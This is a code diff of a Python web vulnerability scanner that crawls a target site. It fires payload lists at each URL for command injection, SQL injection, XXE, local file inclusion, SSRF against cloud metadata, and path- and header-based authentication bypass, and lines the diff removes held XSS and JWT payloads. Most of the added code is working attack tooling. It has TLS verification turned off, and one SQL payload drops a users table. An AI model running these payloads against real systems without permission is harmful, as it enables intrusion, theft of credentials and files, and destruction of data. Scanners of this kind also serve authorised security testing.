@@ -2,14 +2,12 @@
 import sys
 import threading
 import time
-import random
 import re
 import argparse
 import os
 import json
 from urllib.parse import urljoin, urlparse, parse_qs, urlencode
 from concurrent.futures import ThreadPoolExecutor
-from time import sleep
 from collections import defaultdict
 
 # Check for required libraries
@@ -27,21 +25,71 @@ except ImportError as e:
 # Initialize Colorama
 init(autoreset=True)
 
-# ========== 🎨 UI & LOGGING ==========
+# ========== CONFIGURATION ==========
+DEFAULT_THREADS = 10
+DEFAULT_DEPTH = 2
+DEFAULT_TIMEOUT = 15
+REPORT_DIR = "vulnerability_reports"
+CRITICAL_SEVERITY = ["Critical", "High"]
+
+# ========== PAYLOADS ==========
+CRITICAL_PAYLOADS = {
+    "RCE": [
+        ";id;",
+        "|id|",
+        "`id`",
+        "$(id)",
+        "{{id}}",
+        "<?php system('id'); ?>",
+        "<% Runtime.getRuntime().exec(\"id\") %>"
+    ],
+    "SQLi": [
+        "' OR 1=1-- -",
+        "' UNION SELECT null,username,password FROM users-- -",
+        "' WAITFOR DELAY '0:0:10'--",
+        "' OR SLEEP(5)-- -",
+        "1'; DROP TABLE users-- -"
+    ],
+    "XXE": [
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
+    ],
+    "LFI": [
+        "../../../../etc/passwd",
+        "....//....//etc/passwd",
+        "%2e%2e%2fetc%2fpasswd",
+        "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini"
+    ],
+    "SSRF": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://localhost/admin",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:6379/_INFO"
+    ],
+    "AuthBypass": [
+        "/admin/..;/",
+        "/.%2e/admin",
+        "/admin..%2f",
+        "/admin?debug=true",
+        "/admin#"
+    ]
+}
+
+# ========== UI & LOGGING ==========
 class UI:
     @staticmethod
     def banner():
-        print(Fore.CYAN + Style.BRIGHT + r"""
+        print(Fore.RED + Style.BRIGHT + r"""
 ╔════════════════════════════════════════════════════════════╗
-║    ██████╗ ██████╗ ██╗   ██╗███████╗█████╗ ███████╗      ║
-║   ██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗██╔════╝      ║
-║   ██║     ██║   ██║██║   ██║█████╗  ██████╔╝███████╗      ║
-║   ██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║      ║
-║   ╚██████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║███████║      ║
-║    ╚═════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝      ║
+║   ██████╗██████╗ ██╗████████╗██╗ ██████╗ █████╗ ██╗       ║
+║  ██╔════╝██╔══██╗██║╚══██╔══╝██║██╔════╝██╔══██╗██║       ║
+║  ██║     ██████╔╝██║   ██║   ██║██║     ███████║██║       ║
+║  ██║     ██╔══██╗██║   ██║   ██║██║     ██╔══██║██║       ║
+║  ╚██████╗██║  ██║██║   ██║   ██║╚██████╗██║  ██║███████╗  ║
+║   ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝ ╚═════╝╚═╝ ╚═╝╚══════╝  ║
 ╠════════════════════════════════════════════════════════════╣
-║          Advanced Web Vulnerability Scanner v4.0           ║
-║                       By HAMA                               ║
+║          Critical Vulnerability Scanner v2.0               ║
+║               [Authorized Use Only]                        ║
 ╚════════════════════════════════════════════════════════════╝
 """)
 
@@ -51,313 +99,361 @@ class UI:
             "info": Fore.BLUE,
             "success": Fore.GREEN,
             "warning": Fore.YELLOW,
-            "error": Fore.RED
+            "error": Fore.RED,
+            "critical": Fore.RED + Style.BRIGHT
         }
         symbols = {
             "info": "[ℹ]",
             "success": "[✓]",
             "warning": "[!]",
-            "error": "[✗]"
+            "error": "[✗]",
+            "critical": "[☠]"
         }
         print(f"{Fore.WHITE}[{time.strftime('%H:%M:%S')}] {colors.get(level, Fore.WHITE)}{symbols.get(level, '')} {message}")
 
     @staticmethod
     def display_vuln(vuln):
-        print("\n" + "═" * 60)
-        print(f"{Fore.RED}🔥 {vuln['type']} DETECTED!{Style.RESET_ALL}")
+        print("\n" + "═" * 80)
+        print(f"{Fore.RED + Style.BRIGHT}☠ CRITICAL {vuln['type']} DETECTED!{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🔗 URL:{Style.RESET_ALL} {vuln['url']}")
-        
-        if vuln['type'] == "XSS":
-            print(f"{Fore.CYAN}📦 Payload:{Style.RESET_ALL} {vuln['payload']}")
-            if 'parameter' in vuln:
-                print(f"{Fore.CYAN}⚙ Parameter:{Style.RESET_ALL} {vuln['parameter']}")
-        
-        elif vuln['type'] == "Bypass":
-            print(f"{Fore.CYAN}🛠 Technique:{Style.RESET_ALL} {vuln['location']}")
-            print(f"{Fore.CYAN}📌 Payload:{Style.RESET_ALL} {vuln['payload']}")
-            print(f"{Fore.CYAN}🔓 Status:{Style.RESET_ALL} {vuln['status']}")
-        
-        print(f"{Fore.GREEN}✅ Confidence:{Style.RESET_ALL} {vuln['confidence']}")
-        print("═" * 60)
+        print(f"{Fore.CYAN}📦 Payload:{Style.RESET_ALL} {vuln['payload']}")
+        if 'parameter' in vuln:
+            print(f"{Fore.CYAN}⚙ Parameter:{Style.RESET_ALL} {vuln['parameter']}")
+        if 'evidence' in vuln:
+            print(f"{Fore.CYAN}📝 Evidence:{Style.RESET_ALL} {vuln['evidence'][:200]}...")
+        print(f"{Fore.RED + Style.BRIGHT}💀 Severity:{Style.RESET_ALL} {vuln['severity']}")
+        print("═" * 80)
 
-# ========== ⚙ CONFIGURATION ==========
-DEFAULT_THREADS = 15
-DEFAULT_DEPTH = 3
-DEFAULT_TIMEOUT = 10
-REPORT_DIR = "scan_reports"
-
-# ========== 🎯 PAYLOADS ==========
-XSS_PAYLOADS = [
-    "<script>alert('XSS1')</script>",
-    "<img src=x onerror=alert('XSS2')>",
-    "'\"><svg/onload=alert('XSS3')>",
-    "javascript:alert('XSS4')"
-]
-
-BYPASS_PAYLOADS = [
-    "/.%2e/admin", "/..;/admin", "//admin/", "/admin..%2f",
-    "/admin?test=1", "/admin#", "/admin/.json", "/admin..;/"
-]
-
-BYPASS_HEADERS = {
-    "X-Original-URL": "/admin",
-    "X-Rewrite-URL": "/admin",
-    "X-Forwarded-For": "127.0.0.1",
-    "Referer": "https://google.com",
-    "X-Custom-IP-Authorization": "127.0.0.1"
-}
-
-JWT_PAYLOADS = [
-    '{"alg":"none"}',
-    '{"alg":"HS256","typ":"JWT"}',
-    '{"kid":"../../../../dev/null"}'
-]
-
-SQLI_PAYLOADS = [
-    "' OR 1=1--",
-    "' OR 'a'='a",
-    "admin'--",
-    "1' ORDER BY 1--"
-]
-
-LFI_PAYLOADS = [
-    "../../../../etc/passwd",
-    "....//....//etc/passwd",
-    "%2e%2e%2fetc%2fpasswd"
-]
-
-# ========== 🛡 SCANNER CORE ==========
-class Scanner:
+# ========== SCANNER CORE ==========
+class CriticalScanner:
     def __init__(self):
         self.stop_event = threading.Event()
         self.visited = set()
         self.lock = threading.Lock()
-        self.results = []
+        self.critical_findings = []
         self.session = requests.Session()
         self.ua = UserAgent()
-        self.session.headers.update({'User-Agent': self.ua.random})
-        self.report_data = []
+        self.session.headers.update({
+            'User-Agent': self.ua.random,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Connection': 'keep-alive'
+        })
+        self.session.verify = False  # For testing purposes only
+        requests.packages.urllib3.disable_warnings()
 
-    def scan_xss(self, url, html=None):
+    def is_critical(self, response, payload_type):
+        """Determine if the response indicates a critical vulnerability"""
+        indicators = {
+            "RCE": ["uid=", "gid=", "groups=", "root:", "Microsoft Windows"],
+            "SQLi": ["SQL syntax", "MySQL server", "ORA-", "PostgreSQL", "syntax error"],
+            "XXE": ["root:", "daemon:", "/bin/bash"],
+            "LFI": ["root:", "daemon:", "[boot loader]", "extension="],
+            "SSRF": ["AMI ID", "instance-id", "[boot loader]"],
+            "AuthBypass": ["Admin Dashboard", "Welcome, admin", "Administrator Panel"]
+        }
+        
+        if response.status_code in [200, 201, 202, 203, 301, 302, 307, 401, 403, 500]:
+            content = response.text.lower()
+            for indicator in indicators.get(payload_type, []):
+                if indicator.lower() in content:
+                    return True
+        return False
+
+    def scan_rce(self, url):
+        """Remote Code Execution checks"""
         parsed = urlparse(url)
-        if not html:
-            try:
-                res = self.session.get(url, timeout=DEFAULT_TIMEOUT)
-                html = res.text
-            except:
-                return
-
+        
         # Check URL parameters
         if parsed.query:
             for param in parse_qs(parsed.query):
-                for payload in XSS_PAYLOADS:
-                    test_url = url.replace(f"{param}=", f"{param}={payload}")
+                for payload in CRITICAL_PAYLOADS["RCE"]:
                     try:
+                        test_url = url.replace(f"{param}=", f"{param}={payload}")
                         res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
-                        if payload in res.text:
-                            self.results.append({
-                                "type": "XSS",
-                                "url": test_url,
-                                "payload": payload,
-                                "parameter": param,
-                                "confidence": "High"
-                            })
-                            UI.display_vuln(self.results[-1])
+                        if self.is_critical(res, "RCE"):
+                            with self.lock:
+                                self.critical_findings.append({
+                                    "type": "Remote Code Execution",
+                                    "url": test_url,
+                                    "payload": payload,
+                                    "parameter": param,
+                                    "evidence": res.text,
+                                    "severity": "Critical"
+                                })
+                                UI.display_vuln(self.critical_findings[-1])
                     except:
                         continue
-
-        # Check forms
-        soup = BeautifulSoup(html, 'html.parser')
-        for form in soup.find_all('form'):
-            try:
-                action = form.get('action') or url
-                method = form.get('method', 'get').lower()
-                inputs = {i.get('name'): i.get('value', '') for i in form.find_all(['input', 'textarea'])}
-                
-                for payload in XSS_PAYLOADS:
-                    data = {k: payload for k in inputs}
-                    if method == 'post':
-                        res = self.session.post(action, data=data, timeout=DEFAULT_TIMEOUT)
-                    else:
-                        res = self.session.get(action, params=data, timeout=DEFAULT_TIMEOUT)
-                    
-                    if payload in res.text:
-                        self.results.append({
-                            "type": "XSS",
-                            "url": action,
-                            "payload": payload,
-                            "confidence": "Medium"
-                        })
-                        UI.display_vuln(self.results[-1])
-            except:
-                continue
-
-    def scan_bypass(self, url):
-        # Test path bypasses
-        for payload in BYPASS_PAYLOADS:
-            test_url = urljoin(url, payload)
-            try:
-                res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
-                if res.status_code == 200:
-                    self.results.append({
-                        "type": "Bypass",
-                        "url": test_url,
-                        "payload": payload,
-                        "location": "Path",
-                        "status": res.status_code,
-                        "confidence": "Medium"
-                    })
-                    UI.display_vuln(self.results[-1])
-            except:
-                continue
-
-        # Test header bypasses
-        for header, value in BYPASS_HEADERS.items():
-            try:
-                headers = {header: value}
-                res = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
-                if res.status_code == 200:
-                    self.results.append({
-                        "type": "Bypass",
-                        "url": url,
-                        "payload": f"{header}: {value}",
-                        "location": "Header",
-                        "status": res.status_code,
-                        "confidence": "Medium"
-                    })
-                    UI.display_vuln(self.results[-1])
-            except:
-                continue
-
-    def scan_jwt(self, url):
-        """Check for JWT vulnerabilities (CVE-2020-28052, etc.)"""
-        try:
-            res = self.session.get(url, timeout=DEFAULT_TIMEOUT)
-            if "Bearer" in res.headers.get("Authorization", ""):
-                jwt_token = res.headers["Authorization"].split(" ")[1]
-                for payload in JWT_PAYLOADS:
-                    try:
-                        headers = {"Authorization": f"Bearer {payload}"}
-                        res = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
-                        if res.status_code == 200:
-                            self.results.append({
-                                "type": "JWT Bypass",
-                                "url": url,
-                                "payload": payload,
-                                "confidence": "High"
-                            })
-                            UI.display_vuln(self.results[-1])
-                    except:
-                        continue
-        except:
-            pass
 
     def scan_sqli(self, url):
-        """Detect SQL injection vulnerabilities"""
+        """SQL Injection checks"""
         parsed = urlparse(url)
+        
         if parsed.query:
             for param in parse_qs(parsed.query):
-                for payload in SQLI_PAYLOADS:
-                    test_url = url.replace(f"{param}=", f"{param}={payload}")
+                for payload in CRITICAL_PAYLOADS["SQLi"]:
                     try:
+                        test_url = url.replace(f"{param}=", f"{param}={payload}")
                         res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
-                        if "error in your SQL syntax" in res.text.lower():
-                            self.results.append({
-                                "type": "SQLi",
-                                "url": test_url,
-                                "payload": payload,
-                                "confidence": "High"
-                            })
-                            UI.display_vuln(self.results[-1])
+                        if self.is_critical(res, "SQLi"):
+                            with self.lock:
+                                self.critical_findings.append({
+                                    "type": "SQL Injection",
+                                    "url": test_url,
+                                    "payload": payload,
+                                    "parameter": param,
+                                    "evidence": res.text,
+                                    "severity": "Critical"
+                                })
+                                UI.display_vuln(self.critical_findings[-1])
                     except:
                         continue
+
+    def scan_xxe(self, url):
+        """XXE Injection checks"""
+        headers = {'Content-Type': 'application/xml'}
+        for payload in CRITICAL_PAYLOADS["XXE"]:
+            try:
+                res = self.session.post(url, data=payload, headers=headers, timeout=DEFAULT_TIMEOUT)
+                if self.is_critical(res, "XXE"):
+                    with self.lock:
+                        self.critical_findings.append({
+                            "type": "XML External Entity (XXE)",
+                            "url": url,
+                            "payload": payload,
+                            "evidence": res.text,
+                            "severity": "Critical"
+                        })
+                        UI.display_vuln(self.critical_findings[-1])
+            except:
+                continue
 
     def scan_lfi(self, url):
         """Local File Inclusion checks"""
-        for payload in LFI_PAYLOADS:
-            test_url = url + payload
+        for payload in CRITICAL_PAYLOADS["LFI"]:
             try:
+                test_url = urljoin(url, payload)
                 res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
-                if "root:" in res.text:
-                    self.results.append({
-                        "type": "LFI",
-                        "url": test_url,
-                        "payload": payload,
-                        "confidence": "High"
-                    })
-                    UI.display_vuln(self.results[-1])
+                if self.is_critical(res, "LFI"):
+                    with self.lock:
+                        self.critical_findings.append({
+                            "type": "Local File Inclusion",
+                            "url": test_url,
+                            "payload": payload,
+                            "evidence": res.text,
+                            "severity": "High"
+                        })
+                        UI.display_vuln(self.critical_findings[-1])
             except:
                 continue
 
-    def generate_report(self):
-        """Generate HTML report for Termux"""
-        if not os.path.exists(REPORT_DIR):
-            os.makedirs(REPORT_DIR)
+    def scan_ssrf(self, url):
+        """Server Side Request Forgery checks"""
+        parsed = urlparse(url)
         
-        report_path = os.path.join(REPORT_DIR, f"scan_{time.strftime('%Y%m%d_%H%M%S')}.html")
-        with open(report_path, 'w') as f:
-            f.write("<html><body><h1>Scan Report</h1>")
-            for vuln in self.results:
-                f.write(f"<div style='border:1px solid #ccc; padding:10px; margin:5px;'>")
-                f.write(f"<h3>{vuln['type']}</h3>")
-                f.write(f"<p><b>URL:</b> {vuln['url']}</p>")
-                f.write(f"<p><b>Payload:</b> {vuln.get('payload', 'N/A')}</p>")
-                f.write("</div>")
-            f.write("</body></html>")
+        if parsed.query:
+            for param in parse_qs(parsed.query):
+                for payload in CRITICAL_PAYLOADS["SSRF"]:
+                    try:
+                        test_url = url.replace(f"{param}=", f"{param}={payload}")
+                        res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
+                        if self.is_critical(res, "SSRF"):
+                            with self.lock:
+                                self.critical_findings.append({
+                                    "type": "Server Side Request Forgery",
+                                    "url": test_url,
+                                    "payload": payload,
+                                    "parameter": param,
+                                    "evidence": res.text,
+                                    "severity": "High"
+                                })
+                                UI.display_vuln(self.critical_findings[-1])
+                    except:
+                        continue
+
+    def scan_auth_bypass(self, url):
+        """Authentication Bypass checks"""
+        for payload in CRITICAL_PAYLOADS["AuthBypass"]:
+            try:
+                test_url = urljoin(url, payload)
+                res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
+                if self.is_critical(res, "AuthBypass"):
+                    with self.lock:
+                        self.critical_findings.append({
+                            "type": "Authentication Bypass",
+                            "url": test_url,
+                            "payload": payload,
+                            "evidence": res.text,
+                            "severity": "Critical"
+                        })
+                        UI.display_vuln(self.critical_findings[-1])
+            except:
+                continue
+
+        # Test header-based bypasses
+        bypass_headers = {
+            "X-Original-URL": "/admin",
+            "X-Rewrite-URL": "/admin",
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Custom-IP-Authorization": "127.0.0.1"
+        }
         
-        UI.status(f"Report saved to: {report_path}", "success")
+        for header, value in bypass_headers.items():
+            try:
+                headers = {header: value}
+                res = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
+                if self.is_critical(res, "AuthBypass"):
+                    with self.lock:
+                        self.critical_findings.append({
+                            "type": "Authentication Bypass (Header)",
+                            "url": url,
+                            "payload": f"{header}: {value}",
+                            "evidence": res.text,
+                            "severity": "Critical"
+                        })
+                        UI.display_vuln(self.critical_findings[-1])
+            except:
+                continue
 
-    def crawl(self, url, depth=3, threads=10):
-        if depth <= 0 or self.stop_event.is_set():
-            return
-
+    def scan_page(self, url):
+        """Run all critical vulnerability checks on a single URL"""
         try:
-            res = self.session.get(url, timeout=DEFAULT_TIMEOUT)
+            # Skip non-HTTP/HTTPS URLs
+            if not url.startswith(('http://', 'https://')):
+                return
+
+            # Skip already visited URLs
+            with self.lock:
+                if url in self.visited:
+                    return
+                self.visited.add(url)
+
+            UI.status(f"Scanning: {url}", "info")
             
-            # Scan current page
-            self.scan_xss(url, res.text)
-            self.scan_bypass(url)
-            self.scan_jwt(url)
+            # Run all critical vulnerability scans
+            self.scan_rce(url)
             self.scan_sqli(url)
+            self.scan_xxe(url)
             self.scan_lfi(url)
-            
-            # Extract and crawl links
-            soup = BeautifulSoup(res.text, 'html.parser')
-            links = {urljoin(url, a['href']) for a in soup.find_all('a', href=True) 
-                    if urlparse(urljoin(url, a['href'])).netloc == urlparse(url).netloc}
-            
-            with ThreadPoolExecutor(max_workers=threads) as executor:
-                for link in links:
-                    if link not in self.visited:
-                        self.visited.add(link)
-                        executor.submit(self.crawl, link, depth-1, threads)
-                        
+            self.scan_ssrf(url)
+            self.scan_auth_bypass(url)
+
         except Exception as e:
             UI.status(f"Error scanning {url}: {str(e)}", "error")
 
-# ========== 🚀 MAIN EXECUTION ==========
+    def crawl(self, base_url, depth=DEFAULT_DEPTH, threads=DEFAULT_THREADS):
+        """Crawl the website and scan each page"""
+        try:
+            # Start with the base URL
+            self.scan_page(base_url)
+
+            # Get all links from the base URL
+            try:
+                res = self.session.get(base_url, timeout=DEFAULT_TIMEOUT)
+                soup = BeautifulSoup(res.text, 'html.parser')
+                links = {urljoin(base_url, a['href']) for a in soup.find_all('a', href=True)}
+            except:
+                links = set()
+
+            # Scan all found links
+            with ThreadPoolExecutor(max_workers=threads) as executor:
+                for link in links:
+                    if depth > 1:
+                        executor.submit(self.crawl, link, depth-1, threads)
+                    else:
+                        executor.submit(self.scan_page, link)
+
+        except KeyboardInterrupt:
+            UI.status("Scan stopped by user", "error")
+            self.stop_event.set()
+        except Exception as e:
+            UI.status(f"Crawling error: {str(e)}", "error")
+
+    def generate_report(self):
+        """Generate JSON and HTML reports"""
+        if not os.path.exists(REPORT_DIR):
+            os.makedirs(REPORT_DIR)
+
+        timestamp = time.strftime('%Y%m%d_%H%M%S')
+        
+        # JSON Report
+        json_report = {
+            "metadata": {
+                "scan_date": timestamp,
+                "target": self.visited.pop() if self.visited else "Unknown",
+                "vulnerabilities_found": len(self.critical_findings)
+            },
+            "findings": self.critical_findings
+        }
+
+        json_path = os.path.join(REPORT_DIR, f"critical_vulns_{timestamp}.json")
+        with open(json_path, 'w') as f:
+            json.dump(json_report, f, indent=2)
+
+        # HTML Report
+        html_path = os.path.join(REPORT_DIR, f"critical_vulns_{timestamp}.html")
+        with open(html_path, 'w') as f:
+            f.write("""
+            <html>
+            <head>
+                <title>Critical Vulnerability Report</title>
+                <style>
+                    body { font-family: Arial, sans-serif; margin: 20px; }
+                    .vuln { border: 1px solid #d33; margin: 10px 0; padding: 10px; border-radius: 5px; }
+                    .critical { background-color: #ffdddd; }
+                    .high { background-color: #ffe6e6; }
+                    h1 { color: #d33; }
+                    pre { white-space: pre-wrap; background: #f5f5f5; padding: 10px; }
+                </style>
+            </head>
+            <body>
+                <h1>Critical Vulnerability Report</h1>
+                <p>Generated: {}</p>
+                <p>Total Critical Vulnerabilities Found: {}</p>
+            """.format(timestamp, len(self.critical_findings)))
+
+            for vuln in self.critical_findings:
+                f.write(f"""
+                <div class="vuln {vuln['severity'].lower()}">
+                    <h2>{vuln['type']} ({vuln['severity']})</h2>
+                    <p><strong>URL:</strong> {vuln['url']}</p>
+                    <p><strong>Payload:</strong> <code>{vuln['payload']}</code></p>
+                    {f"<p><strong>Parameter:</strong> {vuln['parameter']}</p>" if 'parameter' in vuln else ""}
+                    <p><strong>Evidence:</strong></p>
+                    <pre>{vuln.get('evidence', 'No direct evidence captured')}</pre>
+                </div>
+                """)
+
+            f.write("</body></html>")
+
+        UI.status(f"Reports generated:\n- {json_path}\n- {html_path}", "success")
+
+# ========== MAIN EXECUTION ==========
 if __name__ == "__main__":
     UI.banner()
-    scanner = Scanner()
+    scanner = CriticalScanner()
     
-    parser = argparse.ArgumentParser(description="HAMA's Web Vulnerability Scanner")
+    parser = argparse.ArgumentParser(description="Critical Vulnerability Scanner")
     parser.add_argument("url", help="Target URL (e.g., http://example.com)")
-    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help="Threads (default: 15)")
-    parser.add_argument("-d", "--depth", type=int, default=DEFAULT_DEPTH, help="Crawl depth (default: 3)")
-    parser.add_argument("-r", "--report", action="store_true", help="Generate HTML report")
+    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, 
+                       help=f"Number of threads (default: {DEFAULT_THREADS})")
+    parser.add_argument("-d", "--depth", type=int, default=DEFAULT_DEPTH, 
+                       help=f"Crawl depth (default: {DEFAULT_DEPTH})")
+    parser.add_argument("-r", "--report", action="store_true", 
+                       help="Generate detailed vulnerability report")
     args = parser.parse_args()
 
     try:
-        UI.status(f"Starting scan on {args.url}", "info")
+        UI.status(f"Starting critical vulnerability scan on {args.url}", "info")
         scanner.crawl(args.url, depth=args.depth, threads=args.threads)
         
         if args.report:
             scanner.generate_report()
         
-        if not scanner.results:
-            UI.status("No vulnerabilities found!", "warning")
+        if not scanner.critical_findings:
+            UI.status("No CRITICAL vulnerabilities found!", "success")
         else:
-            UI.status(f"Scan complete! Found {len(scanner.results)} vulnerabilities!", "success")
+            UI.status(f"Scan complete! Found {len(scanner.critical_findings)} CRITICAL vulnerabilities!", "critical")
                 
     except KeyboardInterrupt:
         UI.status("Scan stopped by user", "error")
